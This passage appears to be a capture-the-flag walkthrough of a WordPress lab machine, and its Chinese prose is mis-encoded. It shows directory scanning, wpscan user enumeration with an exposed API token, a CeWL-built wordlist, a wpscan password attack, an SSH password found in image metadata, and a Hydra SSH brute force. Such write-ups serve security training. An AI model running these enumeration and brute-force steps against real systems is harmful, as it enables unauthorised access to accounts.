class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">14</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">26</span>] <span class="number">301</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/index.php</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="symbol">/</span>            </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">26</span>] <span class="number">404</span> <span class="operator">-</span>   <span class="number">10</span>KB <span class="operator">-</span> <span class="operator">/</span>index.php<span class="operator">/</span>login<span class="symbol">/</span>                                 </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">27</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">7</span>KB <span class="operator">-</span> <span class="symbol">/license.txt</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">33</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>KB <span class="operator">-</span> <span class="symbol">/readme.html</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/wp-admin</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="operator">/</span>wp-admin<span class="symbol">/</span>    </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">321</span>B  <span class="operator">-</span> <span class="symbol">/wp-content</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="operator">/</span>wp-content<span class="symbol">/</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="operator">/</span>wp-admin<span class="symbol">/</span>                                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="operator">/</span>wp-content<span class="symbol">/</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">477</span>B  <span class="operator">-</span> <span class="operator">/</span>wp-content<span class="operator">/</span>uploads<span class="symbol">/</span>                              </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">481</span>B  <span class="operator">-</span> <span class="operator">/</span>wp-content<span class="operator">/</span>upgrade<span class="symbol">/</span>                              </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-admin/admin-ajax.php</span>                          </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-config.php</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-content/plugins/hello.php</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">84</span>B  <span class="operator">-</span> <span class="symbol">/wp-content/plugins/akismet/akismet.php</span>           </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">322</span>B  <span class="operator">-</span> <span class="symbol">/wp-includes</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="operator">/</span>wp-includes<span class="symbol">/</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">37</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-includes/rss-functions.php</span>                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">4</span>KB <span class="operator">-</span> <span class="operator">/</span>wp-includes<span class="symbol">/</span>                                     </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-cron.php</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-admin/install.php</span>                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-login.php</span>                                     </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-signup.php</span>                                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/wp-admin/setup-config.php</span>                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">12</span>:<span class="number">38</span>] <span class="number">500</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="operator">/</span>xmlrpc.php</span><br></pre></td></tr></table></figure></div>
<p>æ‰«å‡ºçš„ç›®å½•å’Œwordpressç›¸å…³ï¼Œæ‰€ä»¥ç›´æ¥ç”¨wpscanæ‰«ä¸€ä¸‹ç”¨æˆ·åå’Œæ’ä»¶ï¼Œä½†æ˜¯è¿™é‡Œå› ä¸ºé¶æœºå¾ˆè€ï¼Œæ‰€ä»¥å°½é‡ä¸è¦ç”¨æ’ä»¶çš„æ¼æ´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># wpscan --url 192.168.64.174 --api-token lbD2jRa091DWey2uosBWjfXVj7aZzGayIssDaIuPQSU --enumerate u,ap  --plugins-detection aggressive</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations <span class="operator">-</span> <span class="params">Time:</span> <span class="number">00</span>:<span class="number">09</span>:<span class="number">58</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">109869</span> <span class="symbol">/</span> <span class="number">109869</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">00</span>:<span class="number">09</span>:<span class="number">58</span></span><br><span class="line">[<span class="operator">+</span>] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] akismet</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="symbol">/</span></span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">14</span>T18:<span class="number">49</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.64.174/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | [<span class="operator">!</span>] The version is out of date, the latest version is <span class="number">5.3</span>.<span class="number">7</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">4.1</span>.<span class="number">8</span> (<span class="number">100</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.64.174/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | Confirmed <span class="params">By:</span> Readme <span class="operator">-</span> ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.64.174/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs <span class="operator">-</span> <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">10</span> <span class="symbol">/</span> <span class="number">10</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line">[i] User(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] abuzerkomurcu</span><br><span class="line"> | Found <span class="params">By:</span> Author Posts <span class="operator">-</span> Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span></span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">64.174</span><span class="operator">/</span>index.php<span class="operator">/</span>wp-json<span class="operator">/</span>wp<span class="operator">/</span>v2<span class="operator">/</span>users<span class="operator">/</span><span class="operator">?</span>per_page<span class="operator">=</span><span class="number">100</span>&amp;page<span class="operator">=</span><span class="number">1</span></span><br><span class="line"> |  Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] satanic</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] gill</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] collins</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] gadd</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WPScan DB API OK</span><br><span class="line"> | <span class="params">Plan:</span> free</span><br><span class="line"> | Requests Done (during the scan): <span class="number">3</span></span><br><span class="line"> | Requests <span class="params">Remaining:</span> <span class="number">22</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Finished:</span> Sun Apr  <span class="number">6</span> <span class="number">18</span>:<span class="number">28</span>:<span class="number">22</span> <span class="number">2025</span></span><br><span class="line">[<span class="operator">+</span>] Requests <span class="params">Done:</span> <span class="number">109915</span></span><br><span class="line">[<span class="operator">+</span>] Cached <span class="params">Requests:</span> <span class="number">42</span></span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Sent:</span> <span class="number">29.409</span> MB</span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Received:</span> <span class="number">15.111</span> MB</span><br><span class="line">[<span class="operator">+</span>] Memory <span class="params">used:</span> <span class="number">429.746</span> MB</span><br><span class="line">[<span class="operator">+</span>] Elapsed <span class="params">time:</span> <span class="number">00</span>:<span class="number">10</span>:<span class="number">08</span></span><br></pre></td></tr></table></figure></div>
<p>æŠŠæ‰«åˆ°çš„ç”¨æˆ·åå­˜èµ·æ¥<br>ç„¶åè¿™é‡Œæ˜¯æˆ‘å¡ä½çš„ä¸€ä¸ªç‚¹ï¼Œå› ä¸ºç”¨å¸¸è§çš„å­—å…¸çš„è¯ï¼Œç”¨æˆ·åè¿˜å¤šï¼Œçˆ†ç ´èµ·æ¥çš„æ—¶é—´å°±ç‰¹åˆ«å¤šï¼Œè¿™é‡Œçœ‹äº†wpå­¦åˆ°äº†crewlè¿™ä¸ªå·¥å…·ï¼Œè¿™ä¸ªå·¥å…·æ˜¯åˆ©ç”¨ç½‘é¡µä¸Šçš„ä¿¡æ¯æ¥ç”Ÿæˆä¸€ä¸ªå­—å…¸</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cewl -d 2 -m 6 -w pass.txt -with-numbers 192.168.64.174</span><br><span class="line">CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">cat</span> pass.txt | <span class="built_in">wc</span> -l</span><br><span class="line">937</span><br><span class="line">   </span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°è¿™æ ·å­ç”Ÿæˆçš„å­—å…¸å°±åªæœ‰937<br>ç„¶åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆç”¨  åé¢ä¼šè¯´åˆ°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">â””â”€# wpscan <span class="attr">--url</span> <span class="number">192.168</span>.<span class="number">64.174</span> -U <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">P</span> pass<span class="selector-class">.txt</span> </span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span> Performing password attack on Wp Login against <span class="number">6</span> user/s</span><br><span class="line"><span class="selector-attr">[SUCCESS]</span> - gill / interchangeable                                                                                 </span><br><span class="line">Trying  / Author <span class="selector-tag">Time</span>: <span class="number">00</span>:<span class="number">05</span>:<span class="number">18</span> &lt;=====================================        &gt; (<span class="number">5055</span> / <span class="number">5991</span>) <span class="number">84.37%</span>  ETA: ??:??:??</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67f25d630ba3d5a1d7eec997.png"><br>è¿™é‡Œæ˜¯ç¬¬äºŒä¸ªå¡ä½æˆ‘çš„ç‚¹ï¼Œç™»å½•ä¸Šæ¥ä¹‹åï¼Œæ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯æˆ–è€…ä»€ä¹ˆå¯ä»¥åˆ©ç”¨phpåå¼¹bashçš„åœ°æ–¹<br>è¿™é‡Œè¦ç”¨åˆ°çš„æ˜¯dblogoè¿™ä¸ªå›¾ç‰‡<br><img src="https://pic1.imgdb.cn/item/67f25db30ba3d5a1d7eeca19.png"><br>ä½†æ˜¯è¿™ä¸ªå›¾ç‰‡ä¹Ÿå¯ä»¥åœ¨wp-content&#x2F;wp-uploadè¿™ä¸ªé¡µé¢ç›´æ¥å¾—åˆ°ï¼Œæ‰€ä»¥æˆ‘è¯´è¿™ä¸ªç”¨æˆ·åå’Œå¯†ç æ²¡æœ‰ä»€ä¹ˆç”¨<br>ç„¶åæŠŠå¯ç–‘çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ä¹‹åç”¨exiftoolåˆ†æä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªsshå¯†ç çš„ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">â””â”€#</span> <span class="string">exiftool</span> <span class="string">dblogo.png</span> </span><br><span class="line"><span class="attr">ExifTool Version Number         :</span> <span class="number">13.00</span></span><br><span class="line"><span class="attr">File Name                       :</span> <span class="string">dblogo.png</span></span><br><span class="line"><span class="attr">Directory                       :</span> <span class="string">.</span></span><br><span class="line"><span class="attr">File Size                       :</span> <span class="number">19</span> <span class="string">kB</span></span><br><span class="line"><span class="attr">File Modification Date/Time     :</span> <span class="number">2025</span><span class="string">:04:06</span> <span class="number">18</span><span class="string">:43:24+08:00</span></span><br><span class="line"><span class="attr">File Access Date/Time           :</span> <span class="number">2025</span><span class="string">:04:06</span> <span class="number">18</span><span class="string">:45:07+08:00</span></span><br><span class="line"><span class="attr">File Inode Change Date/Time     :</span> <span class="number">2025</span><span class="string">:04:06</span> <span class="number">18</span><span class="string">:45:07+08:00</span></span><br><span class="line"><span class="attr">File Permissions                :</span> <span class="string">-rw-r--r--</span></span><br><span class="line"><span class="attr">File Type                       :</span> <span class="string">PNG</span></span><br><span class="line"><span class="attr">File Type Extension             :</span> <span class="string">png</span></span><br><span class="line"><span class="attr">MIME Type                       :</span> <span class="string">image/png</span></span><br><span class="line"><span class="attr">Image Width                     :</span> <span class="number">300</span></span><br><span class="line"><span class="attr">Image Height                    :</span> <span class="number">300</span></span><br><span class="line"><span class="attr">Bit Depth                       :</span> <span class="number">8</span></span><br><span class="line"><span class="attr">Color Type                      :</span> <span class="string">RGB</span> <span class="string">with</span> <span class="string">Alpha</span></span><br><span class="line"><span class="attr">Compression                     :</span> <span class="string">Deflate/Inflate</span></span><br><span class="line"><span class="attr">Filter                          :</span> <span class="string">Adaptive</span></span><br><span class="line"><span class="attr">Interlace                       :</span> <span class="string">Noninterlaced</span></span><br><span class="line"><span class="attr">SRGB Rendering                  :</span> <span class="string">Perceptual</span></span><br><span class="line"><span class="attr">Gamma                           :</span> <span class="number">2.2</span></span><br><span class="line"><span class="attr">Pixels Per Unit X               :</span> <span class="number">2835</span></span><br><span class="line"><span class="attr">Pixels Per Unit Y               :</span> <span class="number">2835</span></span><br><span class="line"><span class="attr">Pixel Units                     :</span> <span class="string">meters</span></span><br><span class="line"><span class="attr">XMP Toolkit                     :</span> <span class="string">Adobe</span> <span class="string">XMP</span> <span class="string">Core</span> <span class="number">5.6</span><span class="string">-c142</span> <span class="number">79.160924</span><span class="string">,</span> <span class="number">2017</span><span class="string">/07/13-01:06:39</span></span><br><span class="line"><span class="attr">Creator Tool                    :</span> <span class="string">Adobe</span> <span class="string">Photoshop</span> <span class="string">CC</span> <span class="number">2018</span> <span class="string">(Windows)</span></span><br><span class="line"><span class="attr">Create Date                     :</span> <span class="number">2021</span><span class="string">:02:24</span> <span class="number">02</span><span class="string">:55:28+03:00</span></span><br><span class="line"><span class="attr">Metadata Date                   :</span> <span class="number">2021</span><span class="string">:02:24</span> <span class="number">02</span><span class="string">:55:28+03:00</span></span><br><span class="line"><span class="attr">Modify Date                     :</span> <span class="number">2021</span><span class="string">:02:24</span> <span class="number">02</span><span class="string">:55:28+03:00</span></span><br><span class="line"><span class="attr">Instance ID                     :</span> <span class="string">xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405</span></span><br><span class="line"><span class="attr">Document ID                     :</span> <span class="string">adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b</span></span><br><span class="line"><span class="attr">Original Document ID            :</span> <span class="string">xmp.did:5890be6c-649b-0248-af9b-19889727200c</span></span><br><span class="line"><span class="attr">Color Mode                      :</span> <span class="string">RGB</span></span><br><span class="line"><span class="attr">ICC Profile Name                :</span> <span class="string">sRGB</span> <span class="string">IEC61966-2.1</span></span><br><span class="line"><span class="attr">Format                          :</span> <span class="string">image/png</span></span><br><span class="line"><span class="attr">History Action                  :</span> <span class="string">created,</span> <span class="string">saved</span></span><br><span class="line"><span class="attr">History Instance ID             :</span> <span class="string">xmp.iid:5890be6c-649b-0248-af9b-19889727200c,</span> <span class="string">xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405</span></span><br><span class="line"><span class="attr">History When                    :</span> <span class="number">2021</span><span class="string">:02:24</span> <span class="number">02</span><span class="string">:55:28+03:00,</span> <span class="number">2021</span><span class="string">:02:24</span> <span class="number">02</span><span class="string">:55:28+03:00</span></span><br><span class="line"><span class="attr">History Software Agent          :</span> <span class="string">Adobe</span> <span class="string">Photoshop</span> <span class="string">CC</span> <span class="number">2018</span> <span class="string">(Windows),</span> <span class="string">Adobe</span> <span class="string">Photoshop</span> <span class="string">CC</span> <span class="number">2018</span> <span class="string">(Windows)</span></span><br><span class="line"><span class="attr">History Changed                 :</span> <span class="string">/</span></span><br><span class="line"><span class="attr">Text Layer Name                 :</span> <span class="string">ssh</span> <span class="string">password</span> <span class="string">is</span> <span class="string">59583hello</span> <span class="string">of</span> <span class="string">course</span> <span class="string">it</span> <span class="string">is</span> <span class="string">lowercase</span> <span class="string">maybe</span> <span class="string">not</span></span><br><span class="line"><span class="attr">Text Layer Text                 :</span> <span class="string">ssh</span> <span class="string">password</span> <span class="string">is</span> <span class="string">59583hello</span> <span class="string">of</span> <span class="string">course</span> <span class="string">it</span> <span class="string">is</span> <span class="string">lowercase</span> <span class="string">maybe</span> <span class="string">not</span> <span class="string">:)</span></span><br><span class="line"><span class="attr">Document Ancestors              :</span> <span class="string">adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b</span></span><br><span class="line"><span class="attr">Image Size                      :</span> <span class="string">300x300</span></span><br><span class="line"><span class="attr">Megapixels                      :</span> <span class="number">0.090</span></span><br></pre></td></tr></table></figure></div>
<p>å¯†ç <code>59583hello</code> ç”¨hydraçˆ†ç ´ä¸€ä¸‹ å¾—åˆ°sshçš„ç”¨æˆ·åå’Œå¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -L a.txt -p <span class="number">59583</span>hello ssh:<span class="comment">//192.168.64.174                    </span></span><br><span class="line">Hydra v9.<span class="number">5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https:<span class="comment">//github.com/vanhauser-thc/thc-hydra) starting at 2025-04-06 18:45:47</span></span><br><span class="line">[WARNING] Many SSH configurations limit the number <span class="keyword">of</span> <span class="keyword">parallel</span> tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[WARNING] Restorefile (you have <span class="number">10</span> seconds <span class="keyword">to</span> abort... (use option -I <span class="keyword">to</span> <span class="keyword">skip</span> waiting)) <span class="keyword">from</span> a previous session found, <span class="keyword">to</span> prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max <span class="number">6</span> tasks per <span class="number">1</span> server, overall <span class="number">6</span> tasks, <span class="number">6</span> login tries (l:<span class="number">6</span>/p:<span class="number">1</span>), ~<span class="number">1</span> <span class="keyword">try</span> per task</span><br><span class="line">[DATA] attacking ssh:<span class="comment">//192.168.64.174:22/</span></span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span>.<span class="number">64.174</span>   login: gill   password: <span class="number">59583</span>hello</span><br><span class="line"><span class="number">1</span> <span 